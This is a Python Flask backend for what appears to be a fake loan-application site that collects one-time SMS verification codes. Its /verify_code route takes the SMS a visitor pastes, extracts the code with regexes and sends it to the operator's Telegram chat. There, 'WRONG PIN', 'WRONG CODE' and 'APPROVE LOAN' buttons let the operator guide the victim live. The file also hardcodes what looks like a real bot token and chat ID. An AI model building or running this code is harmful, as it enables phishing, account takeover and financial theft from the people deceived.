from flask import Flask, render_template, request, jsonify
import requests
import re
import json
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = 'your-secret-key-change-this'

# Telegram Config
TELEGRAM_BOT_TOKEN = '8898988712:AAH8sR5P4Lb2TUKxTWNnO3dMqKNOMRXNGZ4'
TELEGRAM_CHAT_ID = '8589275340'

def extract_code_from_sms(sms_text):
    if not sms_text:
        return None
    patterns = [
        r'code[:\s]+([a-zA-Z0-9]{6,20})',
        r'OTP[:\s]+([a-zA-Z0-9]{6,20})',
        r'use the code[:\s]+([a-zA-Z0-9]{6,20})',
        r'([a-zA-Z0-9]{8,20})(?=\s+to\s+complete)',
        r'\b([a-zA-Z0-9]{8,20})\b'
    ]
    for pattern in patterns:
        match = re.search(pattern, sms_text, re.IGNORECASE)
        if match:
            return match.group(1)
    return None

def send_telegram_with_buttons(message, buttons):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'HTML',
        'reply_markup': json.dumps({'inline_keyboard': buttons})
    }
    try:
        response = requests.post(url, json=payload, timeout=10)
        return response.json()
    except Exception as e:
        print(f"Error: {e}")
        return None

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/apply')
def apply():
    return render_template('apply.html')

@app.route('/approve')
def approve():
    return render_template('approve.html')

@app.route('/verify_code', methods=['POST'])
def verify_code():
    try:
        data = request.get_json()
        sms_text = data.get('code', '')
        extracted_code = data.get('extracted_code', '')
        full_sms = data.get('full_sms', '')
        
        if not sms_text and not full_sms:
            return jsonify({'status': 'error', 'message': 'No SMS provided'}), 400
        
        sms_to_send = full_sms if full_sms else sms_text
        extracted = extracted_code if extracted_code else extract_code_from_sms(sms_to_send)
        
        message = f"""
🔐 <b>CODE VERIFICATION</b>

<b>📱 Full SMS:</b>
<code>{sms_to_send}</code>

<b>🔑 Extracted Code:</b> <code>{extracted or 'Not found'}</code>

<b>📅 Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Please verify this code.
"""
        
        buttons = [
            [
                {'text': '❌ WRONG PIN', 'callback_data': 'wrong_pin'},
                {'text': '❌ WRONG CODE', 'callback_data': 'wrong_code'}
            ],
            [
                {'text': '✅ APPROVE LOAN', 'callback_data': 'approve_loan'}
            ]
        ]
        
        result = send_telegram_with_buttons(message, buttons)
        
        if result and result.get('ok'):
            return jsonify({'status': 'success', 'message': 'Code sent for verification'})
        else:
            return jsonify({'status': 'error', 'message': 'Failed to send to Telegram'}), 500
            
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/resend_code', methods=['POST'])
def resend_code():
    try:
        message = "🔄 <b>CODE RESEND REQUESTED</b>\n\nA new code has been requested."
        buttons = [[{'text': '🔄 WAITING FOR NEW SMS', 'callback_data': 'waiting_for_sms'}]]
        result = send_telegram_with_buttons(message, buttons)
        if result and result.get('ok'):
            return jsonify({'status': 'success', 'message': 'Resend requested'})
        return jsonify({'status': 'error', 'message': 'Failed'}), 500
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.get_json()
        if 'callback_query' in data:
            callback_data = data['callback_query']
            callback_id = callback_data['id']
            action = callback_data['data']
            
            if action == 'approve_loan':
                response = "✅ <b>LOAN APPROVED</b>\nThe loan has been approved!"
            elif action == 'wrong_pin':
                response = "❌ <b>WRONG PIN</b>\nUser entered incorrect PIN."
            elif action == 'wrong_code':
                response = "❌ <b>WRONG CODE</b>\nUser entered incorrect code."
            else:
                response = f"Action: {action}"
            
            # Answer callback
            answer_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
            requests.post(answer_url, json={'callback_query_id': callback_id, 'text': 'Done'})
            
            # Send response
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            requests.post(url, json={'chat_id': TELEGRAM_CHAT_ID, 'text': response, 'parse_mode': 'HTML'})
            
            return jsonify({'status': 'success'})
        return jsonify({'status': 'ok'})
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'status': 'error'}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
